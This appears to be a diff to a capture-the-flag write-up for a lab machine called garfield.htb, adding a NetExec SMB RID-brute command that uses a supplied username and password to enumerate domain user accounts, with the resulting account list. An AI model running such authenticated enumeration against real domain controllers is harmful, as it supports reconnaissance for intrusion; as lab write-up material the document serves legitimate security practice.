@@ -130,3 +130,16 @@ SMB         10.129.86.27    445    DC01             SYSVOL          READ        
 
 Just default read access on the default shares
 
+```python
+❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+RODC01$
+krbtgt_8245
+j.arbuckle
+l.wilson
+l.wilson_adm
+```
+
